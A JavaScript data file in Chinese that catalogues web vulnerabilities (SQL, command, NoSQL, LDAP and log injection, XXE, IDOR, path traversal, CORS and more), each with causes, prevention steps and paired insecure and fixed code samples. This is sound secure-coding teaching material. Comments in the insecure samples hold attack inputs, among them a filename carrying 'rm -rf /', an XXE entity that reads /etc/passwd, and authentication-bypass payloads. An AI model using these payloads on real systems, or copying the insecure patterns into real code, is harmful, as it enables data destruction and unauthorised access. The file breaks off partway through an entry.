export const categories = {
  injection: {
    name: '注入类漏洞',
    icon: '💉',
    desc: '攻击者将恶意数据作为命令或查询的一部分发送给解释器,欺骗解释器执行非预期操作。',
    color: '#f85149',
  },
  authentication: {
    name: '身份认证缺陷',
    icon: '🔑',
    desc: '与用户身份验证和会话管理相关的安全弱点,可能导致攻击者冒充其他用户身份。',
    color: '#f0883e',
  },
  'sensitive-data': {
    name: '敏感数据泄露',
    icon: '🔓',
    desc: '存储或传输中的敏感信息未得到充分保护,如凭据泄露、明文传输、不当访问控制。',
    color: '#f85149',
  },
  xxe: {
    name: 'XML 外部实体',
    icon: '📄',
    desc: 'XML 解析器处理外部实体引用时产生的漏洞,可导致文件读取、SSRF 和拒绝服务。',
    color: '#f85149',
  },
  'access-control': {
    name: '访问控制缺陷',
    icon: '🚫',
    desc: '未正确限制用户对资源或功能的访问权限,允许越权操作或信息访问。',
    color: '#f0883e',
  },
  misconfiguration: {
    name: '安全配置错误',
    icon: '⚙️',
    desc: '应用程序、服务器、框架或平台的安全配置不当,暴露不必要的攻击面。',
    color: '#d29922',
  },
  xss: {
    name: '跨站脚本',
    icon: '⚠️',
    desc: '攻击者在网页中注入恶意客户端脚本,在受害者浏览器中执行任意 JavaScript 代码。',
    color: '#f0883e',
  },
  deserialization: {
    name: '不安全的反序列化',
    icon: '📦',
    desc: '反序列化不可信数据导致远程代码执行、对象注入或权限提升。',
    color: '#f85149',
  },
  'vulnerable-components': {
    name: '已知漏洞组件',
    icon: '🧩',
    desc: '使用存在已公开漏洞的第三方库或框架,依赖管理不善导致供应链风险。',
    color: '#f0883e',
  },
  ssrf: {
    name: '服务端请求伪造',
    icon: '🌐',
    desc: '诱导服务器向内部网络发起非预期请求,绕过防火墙访问内部资源。',
    color: '#f0883e',
  },
  cryptography: {
    name: '密码学缺陷',
    icon: '🔐',
    desc: '加密算法、随机数生成或证书验证的错误使用,导致数据保护形同虚设。',
    color: '#f0883e',
  },
  'race-conditions': {
    name: '竞态条件',
    icon: '⏱️',
    desc: '并发执行时对共享资源的检查和操作之间存在可利用的时间窗口。',
    color: '#f0883e',
  },
  'business-logic': {
    name: '业务逻辑漏洞',
    icon: '🧠',
    desc: '应用程序设计中的逻辑缺陷,可被滥用以绕过业务规则或获取不当利益。',
    color: '#d29922',
  },
  csrf: {
    name: 'CSRF & 界面劫持',
    icon: '🎭',
    desc: '诱导已认证用户执行非本意的操作,或劫持用户界面进行欺骗。',
    color: '#f0883e',
  },
  memory: {
    name: '内存安全',
    icon: '💾',
    desc: '与内存管理相关的底层漏洞,主要影响 C/C++ 等非托管语言,可导致代码执行。',
    color: '#f85149',
  },
}

export const severityLabels = {
  critical: '严重',
  high: '高危',
  medium: '中危',
  low: '低危',
}

export const vulnerabilities = [
  // ==================== INJECTION ====================
  {
    id: 'sql-injection',
    title: 'SQL 注入',
    titleEn: 'SQL Injection',
    category: 'injection',
    severity: 'critical',
    cwe: 'CWE-89',
    owasp: 'A03:2021',
    description: '攻击者通过用户输入拼接恶意 SQL 代码,从而操控数据库执行非预期查询,可导致数据泄露、篡改或删除。这是最常见且危害极大的 Web 漏洞之一,已连续十余年位列 OWASP Top 10。',
    cause: '应用程序直接将不可信的用户输入拼接到 SQL 语句中,未使用参数化查询或输入校验,使得攻击者可以闭合原有 SQL 语句并注入恶意代码。根本原因在于代码混淆了数据与指令。',
    impact: '数据库信息泄露、数据篡改/删除、身份认证绕过、通过数据库提权获取操作系统级控制权。',
    prevention: [
      '始终使用参数化查询 (Prepared Statements),绝不可拼接 SQL 字符串',
      '使用 ORM 框架的安全查询方法,避免裸写 SQL',
      '实施输入校验与白名单过滤',
      '遵循最小权限原则配置数据库账户',
      '部署 WAF (Web Application Firewall) 作为纵深防御',
    ],
    vulnerableCode: {
      language: 'java',
      code: `// 不安全: 直接拼接 SQL
String username = request.getParameter("username");
String query = "SELECT * FROM users WHERE username = '" + username + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);
// 攻击输入: ' OR '1'='1' --`,
    },
    fixedCode: {
      language: 'java',
      code: `// 安全: 使用 PreparedStatement
String username = request.getParameter("username");
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, username);
ResultSet rs = stmt.executeQuery();`,
    },
    languages: ['Java', 'Python', 'PHP', 'C#', 'Go', 'JavaScript', 'Ruby'],
    references: [
      'https://owasp.org/www-community/attacks/SQL_Injection',
      'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html',
    ],
  },
  {
    id: 'command-injection',
    title: '命令注入',
    titleEn: 'Command Injection',
    category: 'injection',
    severity: 'critical',
    cwe: 'CWE-77',
    owasp: 'A03:2021',
    description: '攻击者将恶意系统命令通过用户输入注入到应用程序中,使服务器执行非预期的操作系统命令,可导致服务器被完全控制。',
    cause: '应用程序使用 system()、exec()、Runtime.exec() 等函数时直接拼接未校验的用户输入,将数据作为命令的一部分执行。',
    impact: '服务器完全控制、敏感文件读写、反向 Shell 建立、内网横向移动。',
    prevention: [
      '尽量避免直接调用系统命令,使用语言内置 API 完成等价操作',
      '若必须调用,使用参数数组形式传参而非字符串拼接',
      '对输入做严格白名单校验(只允许字母数字和已知安全的字符)',
      '在沙箱、容器或受限用户下执行命令',
    ],
    vulnerableCode: {
      language: 'python',
      code: `# 不安全: 直接拼接命令
import os
filename = request.GET.get("file")
os.system("cat /var/log/" + filename)
# 攻击输入: app.log; rm -rf /`,
    },
    fixedCode: {
      language: 'python',
      code: `# 安全: subprocess + 参数列表 + 白名单
import subprocess
ALLOWED = {"app.log", "error.log", "access.log"}
filename = request.GET.get("file")
if filename in ALLOWED:
    subprocess.run(["cat", f"/var/log/{filename}"], check=True)`,
    },
    languages: ['Python', 'PHP', 'Java', 'Node.js', 'Ruby', 'Go'],
    references: [
      'https://owasp.org/www-community/attacks/Command_Injection',
      'https://cwe.mitre.org/data/definitions/77.html',
    ],
  },
  {
    id: 'nosql-injection',
    title: 'NoSQL 注入',
    titleEn: 'NoSQL Injection',
    category: 'injection',
    severity: 'high',
    cwe: 'CWE-943',
    owasp: 'A03:2021',
    description: '攻击者利用 NoSQL 数据库查询语法的特性,通过构造特殊的 JSON 输入对象,在 MongoDB、Redis 等数据库上绕过查询逻辑或提取数据。',
    cause: '将用户输入直接传递给 NoSQL 查询,特别是允许传递 $where、$regex、$ne 等特殊操作符,且未对输入类型做校验。',
    impact: '认证绕过、数据全量泄露、数据库拒绝服务。',
    prevention: [
      '对用户输入进行类型校验,拒绝 object 和 array 类型作为查询值',
      '清理输入中的 $ 和 . 字符,防止操作符注入',
      '使用 Mongoose 等 ODM 的严格模式',
      '避免使用 $where 操作符',
    ],
    vulnerableCode: {
      language: 'javascript',
      code: `// 不安全: 直接使用用户输入作为查询条件
app.post("/login", async (req, res) => {
  const user = await User.findOne({
    username: req.body.username,
    password: req.body.password
  });
  // 攻击载荷: {"username":"admin","password":{"$ne":""}}
});`,
    },
    fixedCode: {
      language: 'javascript',
      code: `// 安全: 类型校验 + 单独查询 + bcrypt 比对
app.post("/login", async (req, res) => {
  const { username, password } = req.body;
  if (typeof username !== "string" || typeof password !== "string") {
    return res.status(400).json({ error: "Invalid input" });
  }
  const user = await User.findOne({ username });
  if (!user || !(await bcrypt.compare(password, user.password))) {
    return res.status(401).json({ error: "Auth failed" });
  }
});`,
    },
    languages: ['JavaScript', 'Python', 'PHP'],
    references: ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection'],
  },
  {
    id: 'log-injection',
    title: '日志注入',
    titleEn: 'Log Injection / Log Forging',
    category: 'injection',
    severity: 'medium',
    cwe: 'CWE-117',
    owasp: 'A03:2021',
    description: '攻击者在用户输入中嵌入换行符或控制字符污染日志记录,可以伪造日志条目干扰安全监控和审计分析。',
    cause: '直接将用户输入写入日志而未清理换行符 (\\r\\n),攻击者可插入伪造的日志行,DO 日志分析和 SIEM 规则。',
    impact: '日志伪造掩盖攻击痕迹、SOC 分析被误导、日志查看器中的 XSS 攻击。',
    prevention: [
      '对写入日志的用户输入清理换行符和不可打印字符',
      '使用结构化日志框架 (JSON 格式输出)',
      '对日志浏览器做 HTML 编码输出',
      '日志系统与业务系统分离,限制日志文件写入权限',
    ],
    vulnerableCode: {
      language: 'java',
      code: `// 不安全: 用户输入直接写日志
String username = request.getParameter("username");
logger.info("User login attempt: " + username);
// 攻击输入: guest\\nINFO: Admin deleted all records`,
    },
    fixedCode: {
      language: 'java',
      code: `// 安全: 结构化日志 + 参数化
String username = request.getParameter("username")
    .replace("\\n", "_").replace("\\r", "_");
logger.info("User login attempt: username={}", username);`,
    },
    languages: ['Java', 'Python', 'JavaScript', 'Go', 'C#'],
    references: ['https://cwe.mitre.org/data/definitions/117.html'],
  },
  {
    id: 'ldap-injection',
    title: 'LDAP 注入',
    titleEn: 'LDAP Injection',
    category: 'injection',
    severity: 'high',
    cwe: 'CWE-90',
    owasp: 'A03:2021',
    description: '类似于 SQL 注入,攻击者通过构造恶意 LDAP 过滤器语句,篡改 LDAP 查询逻辑,绕过认证或越权获取目录信息。',
    cause: '使用用户输入拼接 LDAP 查询过滤器时未对 LDAP 特殊字符 (*, (, ), \\, NUL) 做转义。',
    impact: '目录信息泄露、认证绕过、权限提升。',
    prevention: [
      '使用 LDAP 参数化查询库',
      '对用户输入中所有 LDAP 特殊字符做正确转义',
      '实施白名单校验',
      '使用安全框架 (如 Spring LDAP 的 LdapQueryBuilder)',
    ],
    vulnerableCode: {
      language: 'java',
      code: `// 不安全: 拼接 LDAP 过滤器
String filter = "(&(uid=" + username + ")(userPassword=" + password + "))";
SearchControls sc = new SearchControls();
NamingEnumeration<?> results = ctx.search("dc=example,dc=com", filter, sc);
// 攻击: username = admin)(&))`,
    },
    fixedCode: {
      language: 'java',
      code: `// 安全: 参数化 + 转义
import org.springframework.ldap.core.LdapTemplate;
import org.springframework.ldap.query.LdapQueryBuilder;

var query = LdapQueryBuilder.query()
    .where("uid").is(username)
    .and("userPassword").is(password);
ldapTemplate.search(query, new MyMapper());`,
    },
    languages: ['Java', 'C#', 'PHP', 'Python'],
    references: ['https://owasp.org/www-community/attacks/LDAP_Injection'],
  },

  // ==================== AUTHENTICATION ====================
  {
    id: 'weak-password-policy',
    title: '弱密码策略',
    titleEn: 'Weak Password Policy',
    category: 'authentication',
    severity: 'high',
    cwe: 'CWE-521',
    owasp: 'A07:2021',
    description: '系统允许用户设置过于简单的密码,攻击者可通过暴力破解、字典攻击或撞库轻易猜解密码。',
    cause: '缺乏密码复杂度要求——未强制最小长度、字符类别组合、未禁止常见弱密码、无密码历史记录防止复用。',
    impact: '账户被暴力破解、撞库攻击导致大规模账户接管、敏感数据泄露。',
    prevention: [
      '强制密码最小长度 ≥ 12 字符 (NIST SP 800-63B 推荐)',
      '检查密码是否出现在 HIBP 已知泄露密码库中',
      '实施账户锁定或登录速率限制',
      '强制使用多因素认证 (MFA)',
      '使用 zxcvbn 等密码强度评估库',
    ],
    vulnerableCode: {
      language: 'javascript',
      code: `// 不安全: 无密码强度要求
app.post("/register", async (req, res) => {
  const { email, password } = req.body;
  const hash = await bcrypt.hash(password, 10);
  await db.users.insert({ email, password: hash });
});`,
    },
    fixedCode: {
      language: 'javascript',
      code: `// 安全: 密码强度校验 + HIBP 检查
const MIN_LENGTH = 12;
const PWD_REGEX = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[@$!%*?&])/;

app.post("/register", async (req, res) => {
  const { email, password } = req.body;
  if (password.length < MIN_LENGTH || !PWD_REGEX.test(password)) {
    return res.status(400).json({ error: "Password too weak" });
  }
  // 可选: 调 HIBP API 检查该密码是否已泄露
  const hash = await bcrypt.hash(password, 12);
  await db.users.insert({ email, password: hash });
});`,
    },
    languages: ['JavaScript', 'Python', 'Java', 'PHP', 'Go'],
    references: [
      'https://pages.nist.gov/800-63-3/sp800-63b.html',
      'https://haveibeenpwned.com/API/v3',
    ],
  },
  {
    id: 'session-fixation',
    title: '会话固定',
    titleEn: 'Session Fixation',
    category: 'authentication',
    severity: 'high',
    cwe: 'CWE-384',
    owasp: 'A07:2021',
    description: '攻击者预先获取一个有效的会话 ID,诱骗受害者使用该会话 ID 登录。登录成功后受害者与攻击者共享同一会话,攻击者可冒充受害者操作。',
    cause: '登录认证成功后未重新生成会话 ID,或允许用户自定义会话 ID 值。',
    impact: '会话劫持、身份冒充、越权操作。',
    prevention: [
      '登录成功 (或权限变更) 后立即重新生成会话 ID',
      '设置合理的会话超时时间并实施空闲超时',
      'Cookie 设置 HttpOnly、Secure、SameSite=Strict/Lax',
      '拒绝用户通过 URL 参数或表单自定义的会话 ID',
    ],
    vulnerableCode: {
      language: 'php',
      code: `<?php
// 不安全: 登录后未重新生成会话 ID
session_start();
if (check_login($_POST['user'], $_POST['pass'])) {
    $_SESSION['user'] = $_POST['user'];
    // 缺少 session_regenerate_id(), 攻击者可固定会话
}
?>`,
    },
    fixedCode: {
      language: 'php',
      code: `<?php
// 安全: 登录后立即重新生成会话 ID
session_start();
if (check_login($_POST['user'], $_POST['pass'])) {
    session_regenerate_id(true); // true = 删除旧会话文件
    $_SESSION['user'] = $_POST['user'];
    $_SESSION['login_time'] = time();
}
?>`,
    },
    languages: ['PHP', 'Java', 'Python', 'Node.js'],
    references: ['https://owasp.org/www-community/attacks/Session_fixation'],
  },
  {
    id: 'jwt-weaknesses',
    title: 'JWT 安全缺陷',
    titleEn: 'JWT Security Weaknesses',
    category: 'authentication',
    severity: 'high',
    cwe: 'CWE-347',
    owasp: 'A07:2021',
    description: 'JWT (JSON Web Token) 实现不当,如接受 none 算法、弱签名密钥、未验证签名、敏感信息写入 payload、无过期时间等。',
    cause: '使用对称密钥但密钥过弱;验证时未指定允许的算法列表;将密码等敏感信息写入 JWT payload 明文段;未设置 exp 或设置过长。',
    impact: '令牌任意伪造、身份冒充、权限无限期有效。',
    prevention: [
      '始终验证 JWT 签名并显式指定允许的算法 (如 ["HS256", "RS256"])',
      '使用 RS256/ES256 非对称算法或 ≥256 位的 HMAC 密钥',
      '设置合理的 exp 过期时间 (推荐 15 分钟) 并实施 refresh token 轮换',
      '绝不在 JWT payload 中存放密码、信用卡号等敏感信息',
      '实施令牌吊销机制 (黑名单或版本号)',
    ],
    vulnerableCode: {
      language: 'javascript',
      code: `// 不安全: 弱密钥 + 长过期 + payload 含敏感数据
const jwt = require("jsonwebtoken");
app.post("/login", (req, res) => {
  const token = jwt.sign(
    { user: req.body.user, password: req.body.pass },
    "weak-secret"
  );
  res.json({ token });
});`,
    },
    fixedCode: {
      language: 'javascript',
      code: `// 安全: 强密钥 + 短过期 + 最小化 payload
const jwt = require("jsonwebtoken");
const secret = process.env.JWT_SECRET;

app.post("/login", async (req, res) => {
  const user = await authenticate(req.body);
  if (!user) return res.status(401).json({ error: "Bad credentials" });

  const token = jwt.sign(
    { sub: user.id, role: user.role },
    secret,
    { algorithm: "HS256", expiresIn: "15m" }
  );
  const refreshToken = crypto.randomBytes(32).toString("hex");
  await storeRefreshToken(user.id, refreshToken);
  res.json({ token, refreshToken });
});`,
    },
    languages: ['JavaScript', 'Python', 'Java', 'Go', 'C#'],
    references: ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens'],
  },

  // ==================== SENSITIVE DATA ====================
  {
    id: 'hardcoded-secrets',
    title: '硬编码凭据',
    titleEn: 'Hardcoded Secrets',
    category: 'sensitive-data',
    severity: 'critical',
    cwe: 'CWE-798',
    owasp: 'A02:2021',
    description: '将密码、API 密钥、数据库连接串、加密密钥等敏感信息直接硬编码在源代码或配置文件中。一旦代码仓库泄露,所有关联系统均面临风险。',
    cause: '开发便利性驱使将凭据写入代码;配置文件忘记加入 .gitignore;测试代码中包含真实凭据;CI/CD 日志打印了密钥。',
    impact: '凭据泄露导致数据库/云服务被未授权访问、横向移动、数据批量泄露。',
    prevention: [
      '使用环境变量或密钥管理服务 (HashiCorp Vault、AWS Secrets Manager、Azure Key Vault)',
      '使用 git-secrets、truffleHog、Gitleaks 扫描提交历史中的凭据',
      '配置文件模板化 (config.example.yml), 实际值在部署时注入',
      'CI/CD 日志中屏蔽敏感值',
      '代码审查阶段重点检查凭据相关代码',
    ],
    vulnerableCode: {
      language: 'python',
      code: `# 不安全: 凭据硬编码在代码中
DB_PASSWORD = "MyP@ssw0rd123!"
API_KEY = "sk-abc123def456ghi789jkl"
DATABASE_URL = "postgresql://admin:secret123@db.host:5432/mydb"
AWS_SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"`,
    },
    fixedCode: {
      language: 'python',
      code: `# 安全: 环境变量 + 必需校验
import os

DB_PASSWORD = os.environ.get("DB_PASSWORD")
API_KEY = os.environ.get("API_KEY")
DATABASE_URL = os.environ.get("DATABASE_URL")

missing = [k for k, v in {
    "DB_PASSWORD": DB_PASSWORD,
    "API_KEY": API_KEY,
    "DATABASE_URL": DATABASE_URL,
}.items() if not v]
if missing:
    raise RuntimeError(f"Missing env vars: {', '.join(missing)}")`,
    },
    languages: ['All'],
    references: [
      'https://cwe.mitre.org/data/definitions/798.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html',
    ],
  },
  {
    id: 'insufficient-tls',
    title: '传输层安全不足',
    titleEn: 'Insufficient Transport Layer Protection',
    category: 'sensitive-data',
    severity: 'high',
    cwe: 'CWE-319',
    owasp: 'A02:2021',
    description: '敏感数据在网络上明文传输,或使用了已被破解的弱加密协议 (TLS 1.0/1.1、SSLv3 等),可被中间人攻击者窃听和篡改。',
    cause: '未启用 HTTPS 或 TLS 终止配置错误;使用自签名证书;允许降级到 HTTP;加密套件包含弱算法。',
    impact: '网络嗅探导致凭据/会话令牌泄露、中间人攻击篡改响应、合规违规。',
    prevention: [
      '全站强制 HTTPS (TLS 1.2+, 推荐 TLS 1.3)',
      '配置 HSTS 头: Strict-Transport-Security',
      '禁用所有 SSLV3、TLSv1.0、TLSv1.1 及弱加密套件',
      '使用 Let\'s Encrypt 或受信任 CA 签发的证书',
      '考虑实施证书固定 (Certificate Pinning) 对抗高级中间人攻击',
    ],
    vulnerableCode: {
      language: 'nginx',
      code: `# 不安全: 监听 HTTP, 无 HSTS
server {
    listen 80;
    server_name example.com;
    location / {
        proxy_pass http://app:3000;
    }
}`,
    },
    fixedCode: {
      language: 'nginx',
      code: `# 安全: HTTPS + HSTS + 现代加密套件
server {
    listen 80;
    server_name example.com;
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl http2;
    server_name example.com;

    ssl_certificate     /etc/ssl/certs/example.com.pem;
    ssl_certificate_key /etc/ssl/private/example.com.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers on;

    add_header Strict-Transport-Security
        "max-age=63072000; includeSubDomains; preload" always;

    location / {
        proxy_pass http://app:3000;
    }
}`,
    },
    languages: ['All'],
    references: [
      'https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html',
      'https://ssl-config.mozilla.org/',
    ],
  },
  {
    id: 'idor',
    title: '不安全直接对象引用',
    titleEn: 'Insecure Direct Object Reference (IDOR)',
    category: 'sensitive-data',
    severity: 'high',
    cwe: 'CWE-639',
    owasp: 'A01:2021',
    description: '应用使用用户提供的 ID 直接访问对象而不验证所有权,攻击者只需修改 ID 参数即可访问他人数据。如 /api/invoice/123 改为 /api/invoice/124 即可查看他人发票。',
    cause: 'API 端点直接使用 URL 参数作为数据库查询条件,未关联校验当前用户与被访问对象之间的所有权关系。',
    impact: '越权访问敏感数据、隐私泄露、数据被未授权修改或删除。',
    prevention: [
      '始终验证当前用户对请求资源的访问权限 (所有权检查)',
      '使用随机不可预测的资源 ID (UUID v4) 而非自增 ID',
      '通过会话获取当前用户身份,绝不信任客户端传递的用户标识',
      '数据库层面实施行级安全策略 (Row-Level Security)',
    ],
    vulnerableCode: {
      language: 'python',
      code: `# 不安全: 直接通过 ID 访问, 无权限校验
@app.get("/api/invoices/{invoice_id}")
async def get_invoice(invoice_id: int):
    return await db.invoices.find(id=invoice_id)
# 用户只需修改 invoice_id 即可查看他人发票`,
    },
    fixedCode: {
      language: 'python',
      code: `# 安全: 验证资源所有者
@app.get("/api/invoices/{invoice_id}")
async def get_invoice(
    invoice_id: int,
    current_user = Depends(get_current_user)
):
    invoice = await db.invoices.find(id=invoice_id)
    if not invoice or invoice.user_id != current_user.id:
        raise HTTPException(status_code=404)
        # 返回 404 而非 403, 避免信息泄露
    return invoice`,
    },
    languages: ['All'],
    references: [
      'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References',
    ],
  },

  // ==================== XXE ====================
  {
    id: 'xxe',
    title: 'XML 外部实体注入',
    titleEn: 'XML External Entity (XXE)',
    category: 'xxe',
    severity: 'critical',
    cwe: 'CWE-611',
    owasp: 'A05:2021',
    description: '攻击者利用 XML 解析器处理外部实体的能力,读取服务器本地文件、发起 SSRF 请求探测内网,或通过 Billion Laughs 攻击造成拒绝服务。',
    cause: 'XML 解析器配置启用了 DTD 处理和外部实体,攻击者可在提交的 XML 中声明外部实体。多数旧版解析器默认启用这些危险功能。',
    impact: '本地文件读取 (/etc/passwd、/etc/shadow、源码)、内网探测、SSRF、拒绝服务。',
    prevention: [
      '完全禁用 DTD 和外部实体处理 (各语言配置方式见代码示例)',
      '优先使用 JSON、YAML 等不易受 XXE 影响的数据格式',
      '若必须使用 XML,升级到最新版解析器并按最佳实践安全配置',
      '对用户提交的 XML 进行 Schema 验证',
    ],
    vulnerableCode: {
      language: 'java',
      code: `// 不安全: 默认配置的 XML 解析器
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(xml)));
// 攻击载荷:
// <!DOCTYPE foo [
//   <!ENTITY xxe SYSTEM "file:///etc/passwd">
// ]>
// <foo>&xxe;</foo>`,
    },
    fixedCode: {
      language: 'java',
      code: `// 安全: 全面禁用外部实体和 DTD
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);`,
    },
    languages: ['Java', 'C#', 'PHP', 'Python', 'Ruby'],
    references: [
      'https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing',
      'https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html',
    ],
  },

  // ==================== ACCESS CONTROL ====================
  {
    id: 'path-traversal',
    title: '路径遍历',
    titleEn: 'Path Traversal',
    category: 'access-control',
    severity: 'high',
    cwe: 'CWE-22',
    owasp: 'A01:2021',
    description: '攻击者通过在文件路径中插入 ../ 序列,突破应用预设的目录界限,读取或覆盖任意文件系统中的文件。',
    cause: '使用用户输入拼接文件路径,未过滤 ../、..\\\\ 等路径穿越字符,也未将访问限制在允许的基础目录内。',
    impact: '读取任意系统文件 (配置文件、证书密钥、数据库文件)、源代码泄露、日志污染。',
    prevention: [
      '避免直接使用用户输入构造文件路径 — 使用映射表/白名单索引',
      '规范化路径后 (realpath) 验证其是否在允许的基础目录内',
      '使用独立的文件服务而非直接从应用目录读取',
      'chroot / 容器化限制文件系统访问范围',
    ],
    vulnerableCode: {
      language: 'python',
      code: `# 不安全: 直接拼接用户路径
@app.get("/download")
def download():
    filename = request.args.get("file")
    return send_file(f"/var/www/files/{filename}")
# 攻击: /download?file=../../etc/passwd`,
    },
    fixedCode: {
      language: 'python',
      code: `# 安全: 路径规范化 + 沙箱校验
import os

BASE_DIR = os.path.realpath("/var/www/files")

@app.get("/download")
def download():
    filename = request.args.get("file")
    safe_path = os.path.realpath(os.path.join(BASE_DIR, filename))
    if not safe_path.startswith(BASE_DIR + os.sep):
        abort(403)
    return send_file(safe_path)`,
    },
    languages: ['All'],
    references: ['https://owasp.org/www-community/attacks/Path_Traversal'],
  },
  {
    id: 'cors-misconfig',
    title: 'CORS 配置错误',
    titleEn: 'CORS Misconfiguration',
    category: 'access-control',
    severity: 'medium',
    cwe: 'CWE-942',
    owasp: 'A01:2021',
    description: '跨域资源共享 (CORS) 配置过于宽松,允许任意 Origin 访问敏感 API 并携带凭证,导致恶意网站可跨域读取用户数据。',
    cause: 'Access-Control-Allow-Origin 使用 * 通配符配合 credentials: true;将请求 Origin 直接反射而不做白名单校验。',
    impact: '受保护的 API 数据被恶意网站跨域读取、用户操作被代理、CSRF 缓解措施被绕过。',
    prevention: [
      '使用明确的 Origin 白名单,拒绝不在列表中的 Origin',
      'credentials 模式下禁止使用 * 通配符',
      '敏感操作不应仅依赖 CORS 作为安全控制',
      '正确配置 Vary: Origin 响应头',
    ],
    vulnerableCode: {
      language: 'javascript',
      code: `// 不安全: 反射任意 Origin + 允许凭证
app.use(cors({
  origin: req => req.headers.origin,  // 危险: 任意 Origin
  credentials: true
}));`,
    },
    fixedCode: {
      language: 'javascript',
      code: `// 安全: Origin 白名单
const ALLOWED_ORIGINS = new Set([
  "https://app.example.com",
  "https://admin.example.com",
]);

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || ALLOWED_ORIGINS.has(origin)) {
      callback(null, true);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  },
  credentials: true,
}));`,
    },
    languages: ['JavaScript', 'Java', 'Python', 'Go', 'PHP'],
    references: [
      'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing',
    ],
  },
  {
    id: 'missing-access-control',
    title: '缺失功能级访问控制',
    titleEn: 'Missing Function-Level Access Control',
    category: 'access-control',
    severity: 'high',
    cwe: 'CWE-862',
    owasp: 'A01:2021',
    description: '敏感功能 (管理面板、内部 API) 未在后端实施访问控制,或仅在前端 UI 层隐藏,攻击者可直接调用后端接口越权操作。',
    cause: '依赖前端隐藏而非后端校验;中间件配置遗漏;默认允许而非默认拒绝策略;路由通配符过度匹配。',
    impact: '未授权执行管理操作、大规模数据泄露、系统配置被篡改。',
    prevention: [
      '每个端点 / 功能在后端独立校验权限 (不要信任前端)',
      '采用默认拒绝策略: 没有任何角色声明 = 禁止访问',
      '使用声明式权限中间件统一拦截,避免遗漏',
      '自动化测试覆盖所有端点的权限矩阵',
    ],
    vulnerableCode: {
      language: 'javascript',
      code: `// 不安全: 管理接口无任何权限保护
app.get("/admin/users", async (req, res) => {
  const users = await db.users.find({});
  res.json(users);
});`,
    },
    fixedCode: {
      language: 'javascript',
      code: `// 安全: 权限中间件检查
const requireRole = (...roles) => (req, res, next) => {
  if (!req.user || !roles.includes(req.user.role)) {
    return res.status(403).json({ error: "Forbidden" });
  }
  next();
};

app.get("/admin/users", requireRole("admin"), async (req, res) => {
  const users = await db.users.find({});
  res.json(users);
});`,
    },
    languages: ['All'],
    references: ['https://cwe.mitre.org/data/definitions/862.html'],
  },

  // ==================== MISCONFIGURATION ====================
  {
    id: 'verbose-errors',
    title: '详细错误信息泄露',
    titleEn: 'Verbose Error Messages',
    category: 'misconfiguration',
    severity: 'medium',
    cwe: 'CWE-209',
    owasp: 'A05:2021',
    description: '生产环境返回详细的异常堆栈、SQL 错误、框架版本号等内部信息,为攻击者侦察阶段提供宝贵情报。',
    cause: 'Debug 模式在生产环境开启;异常直接返回给客户端;框架默认错误页面未替换;API 返回了内部异常详情。',
    impact: '数据库结构泄露 (SQL 错误含表名/列名)、框架版本泄露可定位已知漏洞利用、代码路径暴露。',
    prevention: [
      '生产环境关闭 Debug 模式 (DEBUG=False)',
      '自定义全局错误处理,返回统一的安全错误信息',
      '详细错误写入服务端日志 (不返回客户端),并包含关联 ID 供排查',
      '定期检查框架更新和安全公告',
    ],
    vulnerableCode: {
      language: 'python',
      code: `# 不安全: 生产环境开启 Debug
app = Flask(__name__)
app.config["DEBUG"] = True  # 生产环境绝对不能开启
# 错误页面直接显示完整堆栈跟踪和变量值`,
    },
    fixedCode: {
      language: 'python',
      code: `# 安全: 生产环境配置
import logging
import uuid

app = Flask(__name__)
app.config["DEBUG"] = False
app.config["PROPAGATE_EXCEPTIONS"] = False

@app.errorhandler(Exception)
def handle_error(e):
    error_id = str(uuid.uuid4())
    logging.error(f"Error [{error_id}]: {e}", exc_info=True)
    return {
        "error": "Internal server error",
        "id": error_id,
    }, 500`,
    },
    languages: ['All'],
    references: ['https://cwe.mitre.org/data/definitions/209.html'],
  },
  {
    id: 'missing-security-headers',
    title: '缺失安全响应头',
    titleEn: 'Missing Security Headers',
    category: 'misconfiguration',
    severity: 'medium',
    cwe: 'CWE-693',
    owasp: 'A05:2021',
    description: 'HTTP 响应缺少关键安全头,使浏览器无法启用内置的安全保护机制,显著增加 XSS、Clickjacking、MIME 嗅探和侧信道攻击的风险。',
    cause: 'Web 服务器 / 框架的默认配置未包含安全头;部署时未检查安全头清单。',
    impact: 'XSS 攻击成功率增高、页面可被嵌入透明 iframe (Clickjacking)、浏览器 MIME 嗅探导致非预期代码执行、Referer 泄露敏感 URL。',
    prevention: [
      'Content-Security-Policy: 限制脚本/样式/资源来源',
